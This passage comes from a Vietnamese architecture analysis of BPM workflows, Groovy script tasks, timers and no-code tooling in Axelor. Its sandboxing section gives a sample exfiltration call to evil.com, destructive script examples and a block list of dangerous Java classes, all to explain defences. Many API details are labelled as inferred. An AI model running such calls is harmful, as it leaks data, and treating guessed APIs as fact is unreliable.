<sequenceFlow sourceRef="checkAmount" targetRef="autoApprove">
  <conditionExpression xsi:type="tFormalExpression">
    ${amount &lt; 1000}
  </conditionExpression>
</sequenceFlow>
<sequenceFlow sourceRef="checkAmount" targetRef="manualApproval">
  <conditionExpression xsi:type="tFormalExpression">
    ${amount &gt;= 1000}
  </conditionExpression>
</sequenceFlow>
```

Động cơ đánh giá biểu thức điều kiện tại thời điểm chạy, định tuyến quy trình đến nhánh thích hợp. Biểu thức truy cập biến quy trình và có thể gọi hàm (`${myService.calculateRisk(amount, customer)}`).

---

### 6. NGỮ CẢNH THỰC THI KỊCH BẢN GROOVY VÀ TÍCH HỢP BỘ KHUNG

**Tệp nguồn:** Phụ thuộc Groovy từ BƯỚC 1, suy luận về ngữ cảnh nhiệm vụ kịch bản `[Từ source code và suy luận]`

Kịch bản Groovy trong quy trình BPM cung cấp cơ chế mở rộng mạnh mẽ — người dùng nghiệp vụ có kỹ năng lập trình cơ bản có thể triển khai logic trực tiếp trong định nghĩa quy trình mà không cần viết ủy nhiệm Java biên dịch. Việc Axelor chọn Groovy 3.0.23 (từ phụ thuộc BƯỚC 1) là có chủ đích: Groovy có cú pháp giống Java (đường cong học tập thấp cho nhà phát triển Java), kiểu dữ liệu động (tạo mẫu nhanh), tương tác liền mạch với Java (có thể gọi bất kỳ lớp Java nào), và thực thi thông dịch (không cần bước biên dịch làm chậm triển khai quy trình).

Nhiệm vụ kịch bản thực thi trong ngữ cảnh được chuẩn bị đặc biệt, cung cấp quyền truy cập vào cả biến động cơ BPM LẪN dịch vụ bộ khung Axelor. Thiết kế ngữ cảnh rất quan trọng — quá hạn chế (truy cập biến hạn chế) khiến kịch bản vô dụng, quá cởi mở (truy cập bộ khung không giới hạn) tạo rủi ro bảo mật (kịch bản ác ý có thể xóa dữ liệu, leo thang đặc quyền). Axelor cân bằng bằng cách cung cấp ngữ cảnh được chọn lọc với các lớp trừu tượng hữu ích nhưng ẩn phần nội bộ nguy hiểm.

**Biến chuẩn của động cơ BPM:** `[Suy luận từ mẫu Camunda/Activiti]`

```groovy
// Khả dụng trong mọi nhiệm vụ kịch bản
execution           // DelegateExecution — ngữ cảnh thực thi quy trình
variables          // Map<String, Object> — tất cả biến quy trình
processInstanceId  // String — mã phiên bản duy nhất
activityId         // String — mã nhiệm vụ hiện tại
taskId             // String — mã nhiệm vụ người dùng (nếu áp dụng)

// Ví dụ sử dụng
def currentUser = execution.getVariable('userId')
def orderAmount = variables.get('amount')
execution.setVariable('calculatedTax', orderAmount * 0.1)
```

**Biến ngữ cảnh đặc thù Axelor:** `[Suy luận từ mẫu hệ thống quyền và kiến trúc bộ khung]`

Axelor có thể tiêm các biến đặc thù bộ khung theo quy ước đặt tên `__tênBiến__` (tiền tố/hậu tố gạch dưới kép phân biệt biến bộ khung với biến người dùng):

```groovy
// Biến ngữ cảnh Axelor suy luận
__ctx__       // Ngữ cảnh yêu cầu — yêu cầu HTTP, phiên làm việc, thông tin người dùng
__user__      // Người dùng đã xác thực hiện tại (tương tự điều kiện quyền)
__repo__      // Nhà máy kho dữ liệu — truy cập các kho dữ liệu
__beans__     // Bộ định vị bean/dịch vụ — truy cập dịch vụ được tiêm
__date__      // Tiện ích ngày/giờ hiện tại
__config__    // Thuộc tính cấu hình ứng dụng

// Ví dụ kịch bản sử dụng ngữ cảnh Axelor
def user = __user__
def orderRepo = __repo__(SaleOrder)
def order = orderRepo.find(orderId)

// Cập nhật đơn hàng sử dụng ngữ cảnh người dùng hiện tại
order.confirmedBy = user
order.confirmationDate = __date__.now()
order.statusSelect = SaleOrderRepository.STATUS_CONFIRMED

orderRepo.save(order)

// Gọi dịch vụ nghiệp vụ
def notificationService = __beans__.get(NotificationService)
notificationService.sendOrderConfirmation(order)

// Đặt biến quy trình cho bước tiếp theo
execution.setVariable('orderConfirmed', true)
execution.setVariable('confirmationNumber', order.orderNumber)
```

**Mẫu truy cập kho dữ liệu:** `__repo__(LớpThựcThể)` có thể được triển khai dưới dạng hàm trợ giúp:

```groovy
// Triển khai giả định trong cấu hình động cơ kịch bản
def __repo__ = { Class entityClass ->
    return Beans.get(JpaRepository.class.forName(entityClass.name + "Repository"))
}
```

Lớp trừu tượng ẩn sự phức tạp của tra cứu kho dữ liệu — tác giả kịch bản không cần biết tên lớp kho dữ liệu chính xác, chỉ cần lớp thực thể.

**Hệ quả bảo mật và hộp cát (sandboxing):** `[Suy luận]`

Thực thi Groovy không giới hạn rất nguy hiểm — kịch bản có thể: xóa tất cả bản ghi cơ sở dữ liệu (`__repo__(SaleOrder).all().remove()`), leo thang đặc quyền (`__user__.group = adminGroup`), rò rỉ dữ liệu (`new URL("http://evil.com").openConnection()...`), tiêu hao tài nguyên (`while(true) { /* vòng lặp vô hạn */ }`).

Hệ thống BPM sản xuất phải đặt kịch bản trong hộp cát. Các chiến lược hộp cát:

1. **Hạn chế bộ nạp lớp (classloader)**: Chặn các lớp nguy hiểm (File, Runtime, ProcessBuilder, Socket, URL)
2. **Chặn phương thức**: Chặn lời gọi tới phương thức nhạy cảm (delete, drop, grant)
3. **Giới hạn thời gian thực thi**: Dừng kịch bản chạy lâu hơn ngưỡng (30 giây)
4. **Giới hạn tài nguyên**: Hạn mức bộ nhớ, ngăn vòng lặp vô hạn
5. **Duyệt mã**: Yêu cầu quản trị viên phê duyệt trước khi triển khai quy trình có kịch bản

Camunda cung cấp `SecureScriptTaskListener` và `GroovySandbox` cho mục đích này. Axelor có thể triển khai biện pháp bảo vệ tương tự, dù chi tiết không nhìn thấy trong mã đã phân tích.

**Biên dịch và lưu đệm kịch bản:** `[Suy luận]`

Kịch bản Groovy có thể thông dịch (chậm, linh hoạt) hoặc biên dịch thành mã bytecode (nhanh, cần lưu đệm). Động cơ có thể biên dịch kịch bản lần thực thi đầu tiên, lưu đệm bytecode theo mã băm kịch bản. Các lần thực thi sau tái sử dụng bytecode đã biên dịch — quan trọng cho hiệu năng khi kịch bản thực thi hàng nghìn lần. Bộ đệm (cache) bị vô hiệu hóa khi định nghĩa quy trình thay đổi (phiên bản mới triển khai với kịch bản sửa đổi).

---

### 7. LUỒNG CÔNG VIỆC TẦNG DỊCH VỤ: CÁC MẪU LOGIC NGHIỆP VỤ CỐ ĐỊNH

**Tệp nguồn:** `/modules/axelor-open-suite/axelor-supplychain/src/main/java/com/axelor/apps/supplychain/service/workflow/` `[Từ source code]`

Axelor triển khai **chiến lược luồng công việc kép** — kết hợp quy trình động cơ BPM (cấu hình được tại thời điểm chạy) với luồng công việc tầng dịch vụ (cố định tại thời điểm biên dịch). Mẫu này phổ biến trong hệ thống doanh nghiệp: không phải mọi thứ đều cần chi phí BPM, một số luồng công việc biểu đạt tốt hơn dưới dạng mã thủ tục đơn giản. Hiểu khi nào dùng cách nào rất quan trọng cho các quyết định kiến trúc.

**Mẫu WorkflowService phát hiện được:**

```java
// Tệp: WorkflowCancelServiceSupplychainImpl.java
public class WorkflowCancelServiceSupplychainImpl extends WorkflowCancelServiceImpl {

  @Override
  public void beforeCancel(Invoice invoice) {
    this.oldInvoiceStatusSelect = invoice.getStatusSelect();
  }

  @Override
  public void afterCancel(Invoice invoice) {
    // Cập nhật thực thể liên kết khi hóa đơn bị hủy
    updateSaleOrders(invoice);
    updatePurchaseOrders(invoice);
    updateStockMoves(invoice);
  }

  protected void updateSaleOrders(Invoice invoice) {
    // Tìm đơn bán liên kết với hóa đơn đã hủy
    List<SaleOrder> orders = invoice.getSaleOrderSet();
    for (SaleOrder order : orders) {
      // Hoàn trạng thái đơn hàng nếu đã lập hóa đơn toàn phần
      if (order.getInvoiceStatus() == SaleOrderRepository.INVOICE_STATUS_FULLY_INVOICED) {
        order.setInvoiceStatus(SaleOrderRepository.INVOICE_STATUS_PARTIALLY_INVOICED);
        saleOrderRepo.save(order);
      }
    }
  }
}
```

Luồng công việc tầng dịch vụ triển khai mẫu phương thức mẫu (template method pattern): lớp cơ sở định nghĩa các bước luồng công việc (`beforeCancel`, `afterCancel`), lớp con cung cấp triển khai theo miền cụ thể. Luồng hủy hóa đơn được cố định dưới dạng phương thức Java — không cần BPMN. Tại sao chọn cách tiếp cận này thay vì BPM? Xem ma trận quyết định bên dưới.

**Ma trận quyết định luồng công việc dịch vụ so với quy trình BPM:**

| Yếu tố | Luồng công việc dịch vụ (Java) | Quy trình BPM (BPMN) |
|---------|--------------------------------|------------------------|
| **Độ phức tạp** | Luồng tuyến tính đơn giản, ít nhánh | Luồng phức tạp nhiều điểm quyết định, nhánh song song |
| **Tần suất thay đổi** | Ổn định, hiếm khi thay đổi | Thường xuyên điều chỉnh bởi người dùng nghiệp vụ |
| **Sự tham gia con người** | Hoàn toàn tự động, không có nhiệm vụ người dùng | Cần phê duyệt, bước thủ công |
| **Hiệu năng** | Micro giây (gọi phương thức) | Mili giây (chi phí động cơ, ghi cơ sở dữ liệu) |
| **Gỡ lỗi** | Điểm dừng IDE, dấu vết ngăn xếp | Nhật ký phiên bản quy trình, truy vấn lịch sử |
| **Kiểm thử** | Kiểm thử đơn vị, đối tượng giả | Kiểm thử tích hợp, bộ khung kiểm thử quy trình |
| **Khả năng kiểm tra** | Cam kết mã, quản lý phiên bản | Lịch sử quy trình, sơ đồ phiên bản |

**Khi nào dùng luồng công việc dịch vụ:**
- ✅ Quy trình tự động đơn giản (cập nhật trạng thái, gửi thông báo, tính tổng)
- ✅ Đường dẫn quan trọng về hiệu năng (thực thi hàng nghìn lần/giây)
- ✅ Tích hợp chặt với vòng đời thực thể (bộ lắng nghe JPA gọi dịch vụ luồng công việc)
- ✅ Logic nghiệp vụ ổn định (thuật toán hiếm khi thay đổi)

**Khi nào dùng quy trình BPM:**
- ✅ Quy trình nghiệp vụ phức tạp (chuỗi phê duyệt, phối hợp đa phòng ban)
- ✅ Cần nhiệm vụ người dùng (biểu mẫu, phê duyệt, nhập liệu thủ công)
- ✅ Thay đổi thường xuyên (quy tắc nghiệp vụ phát triển, quy trình điều chỉnh)
- ✅ Quy trình chạy dài (kéo dài nhiều ngày/tuần, sống sót qua khởi động lại)
- ✅ Yêu cầu kiểm tra (tuân thủ cần lịch sử quy trình)

**Cách tiếp cận kết hợp — BPM gọi luồng công việc dịch vụ:**

```xml
<!-- Quy trình BPMN ủy nhiệm cho luồng công việc dịch vụ -->
<serviceTask id="cancelInvoice" name="Cancel Invoice"
             camunda:delegateExpression="${workflowCancelService}">
  <extensionElements>
    <camunda:inputOutput>
      <camunda:inputParameter name="invoiceId">${invoiceId}</camunda:inputParameter>
    </camunda:inputOutput>
  </extensionElements>
</serviceTask>
```

```java
// Luồng công việc dịch vụ được gọi từ BPM
@Named("workflowCancelService")
public class WorkflowCancelServiceDelegate implements JavaDelegate {
  @Inject WorkflowCancelService workflowService;

  public void execute(DelegateExecution execution) {
    Long invoiceId = (Long) execution.getVariable("invoiceId");
    Invoice invoice = invoiceRepo.find(invoiceId);

    // Ủy nhiệm cho luồng công việc tầng dịch vụ
    workflowService.cancel(invoice);
  }
}
```

Tốt nhất của cả hai thế giới: BPM điều phối luồng quy trình cấp cao (nhiệm vụ con người, định tuyến, lên lịch), luồng công việc dịch vụ xử lý thao tác nguyên tử (thực thi quy tắc nghiệp vụ, nhất quán dữ liệu). Phân tách trách nhiệm: nhà thiết kế quy trình tập trung vào luồng, nhà phát triển tập trung vào logic.

---

### 8. SỰ KIỆN HẸN GIỜ VÀ THỰC THI QUY TRÌNH THEO LỊCH TRÌNH

**Tệp nguồn:** Các mẫu cấu hình và tích hợp bộ lập lịch Quartz `[Từ source code và suy luận]`

Sự kiện hẹn giờ BPMN (timer event) cho phép tự động hóa quy trình dựa trên thời gian — khởi chạy quy trình theo lịch (tạo báo cáo hàng ngày), trì hoãn thực thi (chờ 3 ngày trước khi gửi nhắc nhở), và thiết lập thời hạn (leo thang nếu nhiệm vụ chưa hoàn thành trong 24 giờ). Triển khai bộ hẹn giờ trong động cơ BPM thường tận dụng bộ lập lịch công việc; tích hợp Quartz của Axelor (từ BƯỚC 1: `quartz.enable = true`, 3 luồng làm việc) có thể hỗ trợ thực thi bộ hẹn giờ BPM song song với công việc lịch trình cấp ứng dụng.

**Các loại sự kiện hẹn giờ BPMN:** `[Suy luận từ chuẩn BPMN 2.0]`

**1. Sự kiện bắt đầu hẹn giờ — Khởi chạy quy trình theo lịch**
```xml
<startEvent id="dailyReportStart" name="Generate Daily Report">
  <timerEventDefinition>
    <!-- Biểu thức Cron: Mỗi ngày lúc 2 giờ sáng -->
    <timeCycle>0 0 2 * * ?</timeCycle>
  </timerEventDefinition>
</startEvent>
```

Trường hợp sử dụng: Quy trình lô định kỳ (xuất dữ liệu hàng đêm, lập hóa đơn hàng tháng, báo cáo quý). Quy trình tự động khởi tạo phiên bản bởi bộ hẹn giờ — không cần kích hoạt thủ công. Biểu thức Cron hỗ trợ lịch trình phức tạp: "mỗi Thứ Hai lúc 9 giờ", "ngày đầu tháng", "mỗi 15 phút trong giờ làm việc".

**2. Sự kiện trung gian hẹn giờ — Trì hoãn quy trình**
```xml
<intermediateCatchEvent id="waitPeriod" name="Wait 3 Days">
  <timerEventDefinition>
    <!-- Thời lượng ISO 8601 -->
    <timeDuration>P3D</timeDuration>
  </timerEventDefinition>
</intermediateCatchEvent>
```

Trường hợp sử dụng: Theo dõi trì hoãn (gửi nhắc nhở 3 ngày sau khi đặt hàng), thời gian ân hạn (cho phép 7 ngày thanh toán trước khi gửi thông báo thu nợ). Thực thi quy trình tạm dừng tại sự kiện hẹn giờ, tiếp tục sau khi thời lượng hết. Định dạng thời lượng `P3D` (3 ngày), `PT2H` (2 giờ), `PT30M` (30 phút).

**3. Sự kiện biên hẹn giờ — Xử lý quá hạn nhiệm vụ**
```xml
<userTask id="approveOrder" name="Approve Order">
  <boundaryEvent id="approvalTimeout" name="24h Timeout"
                 attachedToRef="approveOrder" cancelActivity="true">
    <timerEventDefinition>
      <timeDuration>PT24H</timeDuration>
    </timerEventDefinition>
  </boundaryEvent>
</userTask>

<sequenceFlow sourceRef="approvalTimeout" targetRef="escalateToManager"/>
```

Trường hợp sử dụng: Thực thi thỏa thuận mức dịch vụ (SLA — Service Level Agreement): phê duyệt trong 24 giờ hoặc leo thang. Nếu nhiệm vụ người dùng không hoàn thành trong thời hạn, sự kiện biên kích hoạt, hủy nhiệm vụ (`cancelActivity="true"`), quy trình đi theo nhánh hết hạn. Cho phép leo thang tự động không cần can thiệp thủ công.

**Tích hợp với bộ lập lịch Quartz:** `[Suy luận]`

Động cơ BPM có thể đăng ký bộ hẹn giờ dưới dạng công việc Quartz:

```java
// Triển khai giả định đăng ký bộ hẹn giờ
public void deployTimerStartEvent(TimerStartEventDefinition timer) {
  JobDetail job = JobBuilder.newJob(BpmTimerJob.class)
    .withIdentity("timer_" + timer.getId())
    .usingJobData("processDefinitionKey", timer.getProcessKey())
    .build();

  CronTrigger trigger = TriggerBuilder.newTrigger()
    .withSchedule(CronScheduleBuilder.cronSchedule(timer.getCronExpression()))
    .build();

  scheduler.scheduleJob(job, trigger);
}
```

**Ngữ cảnh cấu hình Quartz:** `[Từ phát hiện BƯỚC 1]`
```properties
quartz.enable = true
quartz.thread-count = 3
```

Ba luồng làm việc thực thi công việc lịch trình (bộ hẹn giờ BPM + công việc ứng dụng). Về tính đồng thời: nếu nhiều bộ hẹn giờ kích hoạt đồng thời (ví dụ nhiều báo cáo hàng ngày lịch lúc 2 giờ sáng), Quartz xếp hàng công việc, các luồng xử lý tuần tự. Không đủ luồng dẫn đến trì hoãn công việc; quá nhiều luồng gây lãng phí tài nguyên. Kích thước dựa trên tải: 3 luồng phù hợp cho sử dụng bộ hẹn giờ vừa phải (hàng chục bộ hẹn giờ), bộ hẹn giờ tần suất cao (hàng trăm kích hoạt mỗi giờ) có thể cần thêm.

**Bền vững bộ hẹn giờ và cụm:** `[Suy luận]`

Bộ hẹn giờ phải sống sót qua khởi động lại ứng dụng — được lưu trong cơ sở dữ liệu cùng với định nghĩa quy trình. Quartz duy trì bảng công việc (ACT_RU_TIMER trong Camunda, QRTZ_TRIGGERS trong lược đồ Quartz). Khi khởi động, động cơ tải bộ hẹn giờ đang chờ, lên lịch lại trong Quartz. Triển khai theo cụm (nhiều máy chủ ứng dụng) phối hợp qua khóa cơ sở dữ liệu — đảm bảo bộ hẹn giờ kích hoạt chính xác một lần (không bị nhân đôi giữa các nút).

**Đánh đổi về độ chính xác bộ hẹn giờ:**

Bộ hẹn giờ không chính xác đến mili giây — độ trễ chấp nhận được ±vài giây. Ví dụ: bộ hẹn giờ đặt "chính xác 2:00:00 sáng" có thể thực sự kích hoạt lúc 2:00:03 do khoảng thăm dò bộ lập lịch, tồn đọng hàng đợi công việc, hoặc tranh chấp khóa cơ sở dữ liệu. Hầu hết quy trình nghiệp vụ chấp nhận được (báo cáo hàng ngày lúc 2:00 hay 2:00:03 không đáng kể), nhưng giao dịch tần suất cao hoặc hệ thống thời gian thực cần cơ chế khác (nền tảng phát trực tuyến chuyên dụng, không phải BPM).

---

### 9. TRÌNH XÂY DỰNG KHÔNG MÃ TRONG STUDIO: CÔNG CỤ THIẾT KẾ TRỰC QUAN

**Tệp nguồn:** Suy luận từ kiến trúc Studio và công cụ BPM chuẩn trong ngành `[Suy luận]`

Giá trị cốt lõi của Axelor Studio tập trung vào công cụ **không mã/ít mã** (no-code/low-code) — cho phép nhà phân tích nghiệp vụ và người dùng nâng cao cấu hình ứng dụng mà không cần viết mã Java. Thành phần BPM của Studio có thể bao gồm các trình xây dựng trực quan tương đương nền tảng BPM chuẩn trong ngành (Camunda Modeler, Activiti Designer, Bizagi Modeler). Phân tích dựa trên các mẫu phổ biến trong công cụ BPM doanh nghiệp và cách tiếp cận đã chứng minh của Axelor đối với cấu hình trực quan (trình soạn XML miền, trình thiết kế XML giao diện).

**Các thành phần giao diện Studio suy luận:**

**1. Trình mô hình quy trình — Trình soạn thảo BPMN trực quan**

Chức năng tương đương Camunda Modeler:
- **Vùng vẽ (Canvas)**: Kéo thả các hình BPMN (nhiệm vụ, cổng, sự kiện)
- **Bảng màu (Palette)**: Các phần tử BPMN khả dụng tổ chức theo loại
- **Bảng thuộc tính**: Cấu hình phần tử đang chọn (tên, người phụ trách, kịch bản, điều kiện)
- **Xác thực**: Kiểm tra lỗi thời gian thực (luồng bị ngắt, thiếu cấu hình)
- **Nhập/Xuất**: Tải tệp .bpmn hiện có, xuất để quản lý phiên bản
- **Triển khai**: Triển khai bằng một cú nhấp vào động cơ

Hộp thoại cấu hình phần tử:
- **Nhiệm vụ người dùng**: Giao cho người dùng/nhóm, định nghĩa trường biểu mẫu, đặt hạn
- **Nhiệm vụ dịch vụ**: Chọn lớp ủy nhiệm Java hoặc chỉ định biểu thức
- **Nhiệm vụ kịch bản**: Trình soạn Groovy với tô sáng cú pháp
- **Cổng**: Trình xây dựng điều kiện cho quyết định định tuyến
- **Sự kiện hẹn giờ**: Trình xây dựng biểu thức Cron với lịch trực quan

**2. Trình xây dựng truy vấn — Tạo bộ lọc trực quan**

Tương tự trình xây dựng điều kiện quyền (từ BƯỚC 3):
- **Bộ chọn thực thể**: Chọn thực thể truy vấn (SaleOrder, Invoice, Partner)
- **Bộ chọn trường**: Chọn trường để lọc (trạng thái, số tiền, ngày)
- **Bộ chọn toán tử**: Toán tử so sánh (bằng, lớn hơn, chứa, giữa)
- **Nhập giá trị**: Hằng số hoặc biến (`${processVariable}`)
- **Xem trước**: Kiểm thử truy vấn, xem kết quả mẫu

Ví dụ xây dựng truy vấn:
```
Thực thể: SaleOrder
Bộ lọc:
  - statusSelect BẰNG ${SaleOrderRepository.STATUS_DRAFT}
  - VÀ clientPartner.id TRONG (${userPartnerSet})
  - VÀ exTaxTotal LỚN HƠN 1000
  - VÀ orderDate GIỮA ${startDate} VÀ ${endDate}

Truy vấn được sinh:
Query.of(SaleOrder.class)
  .filter("self.statusSelect = :status")
  .filter("self.clientPartner.id in (:partners)")
  .filter("self.exTaxTotal > :minAmount")
  .filter("self.orderDate between :start and :end")
  .bind("status", statusDraft)
  .bind("partners", partnerIds)
  .bind("minAmount", 1000)
  .bind("start", startDate)
  .bind("end", endDate)
  .fetch()
```

**3. Trình xây dựng ánh xạ — Ánh xạ biến**

Ánh xạ biến quy trình ↔ trường thực thể:
- **Nguồn**: Biến quy trình hoặc trường thực thể
- **Đích**: Trường thực thể hoặc biến quy trình
- **Biến đổi**: Chuyển đổi tùy chọn (định dạng ngày, viết thường chuỗi, tính toán)
- **Hướng**: Đầu vào (quy trình → thực thể), Đầu ra (thực thể → quy trình), Hai chiều

Ví dụ ánh xạ cho quy trình "Tạo hóa đơn từ đơn bán":
```
Biến quy trình → Thực thể hóa đơn:
  ${saleOrderId}        → invoice.saleOrder.id
  ${invoiceDate}        → invoice.invoiceDate
  ${dueDate}            → invoice.dueDate
  ${totalAmount}        → invoice.inTaxTotal

Thực thể hóa đơn → Biến quy trình:
  invoice.invoiceNumber → ${invoiceNumber}
  invoice.id            → ${invoiceId}
  invoice.statusSelect  → ${invoiceStatus}
```

**4. Trình xây dựng điều kiện — Trình xây dựng logic có điều kiện**

Trình xây dựng biểu thức trực quan cho điều kiện cổng, tiêu chí hoàn thành nhiệm vụ:
- **Trình soạn biểu thức**: Trình soạn văn bản có tự động hoàn thiện
- **Bộ chọn biến**: Danh sách biến quy trình/ngữ cảnh khả dụng
- **Thư viện hàm**: Hàm tích hợp sẵn (tính toán ngày, xử lý chuỗi, tập hợp)
- **Chế độ kiểm thử**: Đánh giá biểu thức với dữ liệu mẫu

Ví dụ điều kiện: "Phê duyệt tự động nếu số tiền < 1000 VÀ đánh giá khách hàng tốt"
```groovy
${amount < 1000 && customer.rating >= 4}
```

Trình xây dựng hỗ trợ cú pháp — ngăn lỗi chính tả như `${amout < 1000}` (viết sai tên biến), gợi ý trường khả dụng trên thực thể khi gõ `customer.`.

**5. Trình thiết kế biểu mẫu — Biểu mẫu nhiệm vụ người dùng**

Thiết kế biểu mẫu hiển thị khi người dùng hoàn thành nhiệm vụ:
- **Bảng màu trường**: Văn bản, số, ngày, hộp kiểm, danh sách thả xuống, tải tệp
- **Bố cục**: Kéo thả trường vào lưới bố cục
- **Xác thực**: Trường bắt buộc, giá trị tối thiểu/tối đa, mẫu biểu thức chính quy
- **Ràng buộc**: Ánh xạ trường biểu mẫu tới biến quy trình
- **Kiểu dáng**: Tùy chỉnh CSS cơ bản

Hiển thị biểu mẫu: biểu mẫu được sinh nhúng trong giao diện Axelor, người dùng điền biểu mẫu, giá trị lưu vào biến quy trình, nhiệm vụ hoàn thành.

**Lợi ích của trình xây dựng không mã:**

1. **Giao hàng nhanh hơn**: Nhà phân tích nghiệp vụ thiết kế quy trình mà không phải chờ hàng đợi nhà phát triển
2. **Tinh chỉnh lặp lại**: Dễ dàng sửa đổi quy trình dựa trên phản hồi người dùng
3. **Chi phí thấp hơn**: Giảm giờ công nhà phát triển cho tự động hóa đơn giản
4. **Quyền sở hữu nghiệp vụ**: Chuyên gia miền (không phải CNTT) quản lý quy trình
5. **Tài liệu hóa**: Sơ đồ BPMN trực quan đồng thời là tài liệu quy trình

**Hạn chế:**

1. **Logic phức tạp**: Thuật toán tinh vi vẫn cần mã Java tùy chỉnh
2. **Hiệu năng**: Trình xây dựng trực quan sinh mã kém tối ưu hơn mã viết tay
3. **Quản lý phiên bản**: Tệp .bpmn nhị phân khó so sánh/hợp nhất hơn mã văn bản
4. **Kiểm thử**: Kiểm thử tự động quy trình trực quan phức tạp hơn
5. **Gỡ lỗi**: Lỗi thời gian chạy trỏ tới XML BPMN, không phải phần tử trực quan thân thiện

---

### 10. NHỮNG ĐIỀU KHÔNG TÌM THẤY TRONG MÃ NGUỒN

Phân tích BPM toàn diện bị giới hạn bởi kiến trúc tiện ích bên ngoài — nhiều chi tiết triển khai vẫn ẩn trong tệp nhị phân Studio độc quyền. Việc ghi nhận bằng chứng vắng mặt quan trọng để đặt kỳ vọng thực tế và xác định lĩnh vực cần điều tra thêm hoặc tra cứu tài liệu nhà cung cấp.

**1. Mã nguồn động cơ BPM** `[Không tìm thấy]`
- **Lý do**: Đóng gói trong tệp JAR nhị phân axelor-studio:3.5.1
- Không thể kiểm tra: khởi tạo động cơ quy trình (ProcessEngine), logic triển khai quy trình, nội bộ thực thi thời gian chạy
- Không thể xác nhận: động cơ chính xác (Camunda/Activiti/Flowable), phiên bản, ấn bản
- Tác động: không thể gỡ lỗi vấn đề cấp động cơ, phải dựa vào nhật ký và tài liệu bên ngoài

**2. Tệp BPMN/DMN trong kho mã** `[Không tìm thấy]`
- Không có tệp .bpmn, .bpmn20.xml, .dmn nào trong mã nguồn phân tích được
- **Suy luận**: Quy trình lưu trong cơ sở dữ liệu (tải lên qua giao diện Studio), không phải hệ thống tệp
- Giải thích thay thế: quy trình mẫu trong tiện ích Studio, không triển khai tới dự án khách hàng
- Tác động: không thể nghiên cứu quy trình mẫu để học thực hành tốt nhất

**3. Dịch vụ triển khai quy trình** `[Không tìm thấy]`
- Không có `ProcessDeploymentService`, `BpmnDeployer` hay lớp tương tự trong mô-đun nghiệp vụ
- **Suy luận**: Logic triển khai nằm trong tiện ích Studio
- API có thể phơi bày: `studioService.deployProcess(bpmnXml)`, gọi từ giao diện Studio
- Tác động: không thể mở rộng logic triển khai (xác thực tùy chỉnh, tiền xử lý)

**4. Triển khai động cơ DMN** `[Không tìm thấy]`
- Không có cấu hình DMN (Decision Model and Notation — Ký pháp Mô hình Quyết định), tham chiếu bảng quyết định, mã đánh giá DMN
- **Suy luận**: Nếu động cơ là Camunda → hỗ trợ DMN có sẵn nhưng chưa được sử dụng tích cực trong các mô-đun phân tích
- Giải thích thay thế: tính năng DMN tồn tại nhưng khách hàng chưa áp dụng
- Tác động: chưa rõ DMN có khả thi cho tự động hóa quy tắc nghiệp vụ không

**5. Lược đồ cơ sở dữ liệu BPM** `[Không tìm thấy]`
- Không có di chuyển (migration) Flyway/Liquibase tạo bảng BPM (ACT_* trong Camunda)
- **Suy luận**: Động cơ BPM tự tạo lược đồ khi khởi động lần đầu (tương tự Hibernate DDL auto)
- Rủi ro: không quản lý phiên bản thay đổi lược đồ, di chuyển tự động có thể thất bại
- Tác động: không thể kiểm tra cấu trúc bảng, chỉ mục, khóa ngoại mà không chạy ứng dụng

**6. Trình thực thi nhiệm vụ bên ngoài (External Task Worker)** `[Không tìm thấy]`
- Không có mã ExternalTaskClient, đăng ký chủ đề, triển khai trình thực thi
- **Suy luận**: Mẫu nhiệm vụ bên ngoài có thể không được sử dụng, mọi nhiệm vụ thực thi trong tiến trình
- Tác động: không thể xác định xử lý nhiệm vụ phân tán có khả thi không

**7. Kiểm thử đơn vị quy trình** `[Không tìm thấy]`
- Không có chú thích @Deployment, ProcessEngineRule, xác nhận assertProcessEnded
- Kiểm thử mô-đun nghiệp vụ tập trung vào tầng dịch vụ, không phải thực thi quy trình
- **Suy luận**: Kiểm thử quy trình thực hiện thủ công qua giao diện Studio, không tự động hóa
- Tác động: nguy cơ hồi quy khi sửa đổi quy trình — không có xác minh tự động

**8. Tích hợp BPM đa thuê** `[Không rõ]`
- Không thấy triển khai quy trình theo thuê chủ, phiên bản quy trình cô lập theo thuê chủ
- **Câu hỏi**: Các thuê chủ khác nhau có thể có phiên bản khác nhau cùng một quy trình không?
- **Câu hỏi**: Biến quy trình có tự động thuộc phạm vi thuê chủ không?
- Tác động: triển khai đa thuê có thể cần logic cô lập tùy chỉnh

**9. Bảng điều khiển giám sát quy trình** `[Không tìm thấy]`
- Không có mã giao diện giám sát kiểu Cockpit (phiên bản đang chạy, công việc thất bại, bản đồ nhiệt)
- **Suy luận**: Studio có thể cung cấp giám sát cơ bản (danh sách phiên bản, xem lịch sử)
- Giám sát doanh nghiệp (theo dõi SLA, phân tích nút thắt) có thể cần phát triển tùy chỉnh
- Tác động: tầm nhìn hạn chế vào thực thi quy trình trên sản xuất

**10. Mở rộng BPM tùy chỉnh** `[Không tìm thấy]`
- Không có loại sự kiện BPMN tùy chỉnh, loại nhiệm vụ độc quyền, ngôn ngữ biểu thức mở rộng
- **Suy luận**: Axelor sử dụng BPMN 2.0 chuẩn không có phần mở rộng đặc thù nhà cung cấp
- Lợi ích: quy trình có thể chuyển đổi sang động cơ BPMN khác (Camunda Cockpit, Activiti Explorer)
- Hạn chế: không thể tận dụng lối tắt đặc thù Axelor (ví dụ "EntityUpdateTask" cho mẫu phổ biến)

---

### 11. CÂU HỎI MỞ VÀ ĐIỂM CẦN NGHIÊN CỨU THÊM

Phân tích BPM đặt ra nhiều câu hỏi cần kiểm thử thực hành, xem tài liệu Studio, hoặc liên hệ trực tiếp với đội hỗ trợ/cộng đồng Axelor:

**1. Xác nhận động cơ:**
- Động cơ BPM chính xác là gì? Camunda 7.x, Activiti 7.x, Flowable 6.x, hay tùy chỉnh?
- Ấn bản Cộng đồng hay Doanh nghiệp?
- Có bản vá/sửa đổi đặc thù Axelor nào không?

**2. Đặc tính hiệu năng:**
- Thông lượng phiên bản quy trình (số phiên bản/giây bền vững)?
- Giới hạn thực thi đồng thời (vượt quá 50 kết nối)?
- Dấu chân bộ nhớ mỗi phiên bản đang chạy?
- Lịch trình công việc dọn dẹp lịch sử (hàng đêm? hàng tuần?)

**3. Mẫu tích hợp:**
- API REST khởi chạy quy trình từ bên ngoài (webhook, tích hợp)?
- Tương quan thông điệp (nhận sự kiện bên ngoài giữa quy trình)?
- Phát tín hiệu (kích hoạt nhiều quy trình đang chờ)?
- Giao tiếp giữa các quy trình (hoạt động gọi — call activity)?

**4. Xử lý lỗi:**
- Cấu hình thử lại nhiệm vụ thất bại (số lần thử, chiến lược lùi)?
- Quản lý sự cố (xử lý lỗi không khôi phục được)?
